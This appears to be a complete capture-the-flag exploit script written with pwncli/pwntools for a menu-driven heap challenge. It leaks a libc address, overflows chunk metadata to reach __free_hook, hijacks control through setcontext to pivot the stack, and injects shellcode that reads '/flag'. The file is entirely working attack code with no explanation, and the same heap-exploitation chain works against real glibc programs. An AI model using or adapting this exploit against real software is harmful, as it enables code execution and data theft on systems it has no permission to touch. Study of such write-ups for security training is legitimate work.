#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

def login():
    p.sendafter("please input username: ", "admin\x00")
    p.sendafter("please input password: ", "c"*32)


def add(size, data="a\n"):
    p.sendlineafter(">> :\n", "1")
    p.sendlineafter("Size: \n", str(size))
    p.sendafter("what's your Content: \n", data)


def delete(idx):
    p.sendlineafter(">> :\n", "2")
    p.sendlineafter("Index:\n", str(idx))

def show(idx):
    p.sendlineafter(">> :\n", "3")
    p.sendlineafter("Index:\n", str(idx))
    m = p.recvline()
    info(f"Get info:{m}")
    return m

def edit(idx, data):
    p.sendlineafter(">> :\n", "4")
    p.sendlineafter("Index:\n", str(idx))
    p.sendafter("Content:\n", data)

login()

add(0x420)
add(0x10) # 1

# get unsorted bin 
delete(0)

# leak libc addr
add(0x8, "a"*8)
edit(0, "a"*8)

m = show(0)
libc_base_addr = u64_ex(m[0x11:0x17])- 0x3ec090
log_libc_base_addr(libc_base_addr) 
libc.address = libc_base_addr

# overflow write
add(0x20) # 2
delete(2)
delete(0)
add(0x10, flat({0x10:[0, 0x311, libc.sym['__free_hook']-0x200]}))

add(0x20)

# setcontext to exec shellcode 
payload = flat({
    0x200:libc.sym['setcontext']+53,
    0x100: 0x23330000, # rsp
    0xa0: libc.sym['__free_hook']-0x100 ,# rsp
    0x68: 0, # rdi
    0x70: 0x23330000, # rsi
    0x88: 0x200,
    0xa8: libc.sym['read'] # rcx
}, filler="\x00")
add(0x20, payload)

delete(3)

sleep(1)

p.sendline(asm(shellcraft.cat("/flag")))

p.interactive()





